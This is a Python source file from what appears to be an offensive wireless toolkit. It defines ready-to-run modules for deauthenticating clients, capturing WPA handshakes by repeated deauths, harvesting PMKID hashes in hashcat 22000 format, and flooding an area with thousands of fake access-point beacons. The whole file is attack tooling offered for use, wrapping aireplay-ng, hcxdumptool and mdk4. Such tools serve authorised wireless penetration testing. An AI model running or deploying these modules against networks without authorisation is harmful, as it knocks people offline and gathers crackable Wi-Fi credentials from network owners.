"""Deauth, handshake capture, PMKID harvest and beacon flood."""

from __future__ import annotations

from omni.core import console
from omni.core.module import Option
from omni.wifi import capture as cap
from omni.wifi.modules._base import WifiModule


class Deauth(WifiModule):
    NAME = "wifi.deauth"
    DESCRIPTION = "Kick a client (or every client) off an access point"
    NEEDS = ("aireplay-ng",)
    OPTIONS = (Option("BSSID", "access point MAC", "", required=True),
               Option("CLIENT", "client MAC", "FF:FF:FF:FF:FF:FF"),
               Option("COUNT", "deauth frames to send", "8"),
               Option("IFACE", "monitor interface (auto)"))

    def execute(self) -> dict:
        mon = self.monitor()
        res = cap.deauth(mon, self.get("BSSID"), self.get("CLIENT"),
                         self.get_int("COUNT", 8))
        for line in res.lines()[-6:]:
            console.info(line)
        return {"iface": mon, "ok": res.ok, "count": self.get_int("COUNT", 8)}


class Handshake(WifiModule):
    NAME = "wifi.handshake"
    DESCRIPTION = "Capture a WPA 4-way handshake (deauths until it lands)"
    NEEDS = ("airodump-ng", "aireplay-ng", "aircrack-ng")
    OPTIONS = (Option("BSSID", "access point MAC", "", required=True),
               Option("CHANNEL", "AP channel (blank = look it up)"),
               Option("SECONDS", "capture budget", "90"),
               Option("IFACE", "monitor interface (auto)"))

    def _channel(self, bssid: str) -> int:
        """The AP's channel, looked up when the operator did not supply one."""
        from omni.wifi import scan
        try:
            aps = scan.scan_any(self.get("IFACE") or "")
        except Exception:  # noqa: BLE001 - a lookup, not an attack
            aps = []
        wanted = bssid.strip().upper()
        for ap in aps:
            if str(ap.get("bssid", "")).upper() == wanted and ap.get("channel"):
                return int(ap["channel"])
        raise ValueError("channel unknown for that BSSID — pass CHANNEL")

    def execute(self) -> dict:
        mon = self.monitor()
        channel = self.get_int("CHANNEL", 0) or self._channel(self.get("BSSID"))
        out = cap.handshake(mon, self.get("BSSID"), channel,
                            self.get_int("SECONDS", 90))
        if out["handshake"]:
            console.ok(f"handshake captured: {out['pcap']}")
        else:
            console.warn(f"no handshake yet; capture kept at {out['pcap']}")
        return out


class Pmkid(WifiModule):
    NAME = "wifi.pmkid"
    DESCRIPTION = "Harvest PMKID hashes (clientless) and convert to 22000"
    NEEDS = ("hcxdumptool",)
    OPTIONS = (Option("BSSID", "target AP MAC (blank = all)"),
               Option("SECONDS", "harvest budget", "60"),
               Option("IFACE", "monitor interface (auto)"))

    def execute(self) -> dict:
        mon = self.monitor()
        out = cap.pmkid(mon, self.get("BSSID") or None,
                        self.get_int("SECONDS", 60))
        if out["pmkids"]:
            console.ok(f"{out['pmkids']} PMKID hash(es) -> {out['hashfile']}")
        else:
            console.warn("no PMKID returned (AP may not support it)")
        return out


class Flood(WifiModule):
    NAME = "wifi.flood"
    DESCRIPTION = "Beacon flood fake access points (mdk4)"
    NEEDS = ("mdk4",)
    OPTIONS = (Option("COUNT", "number of fake APs", "2000"),
               Option("IFACE", "monitor interface (auto)"))

    def execute(self) -> dict:
        mon = self.monitor()
        res = cap.beacon_flood(mon, None, self.get_int("COUNT", 2000))
        console.info(res.text.splitlines()[-1] if res.text else "started")
        return {"iface": mon, "ok": res.ok}
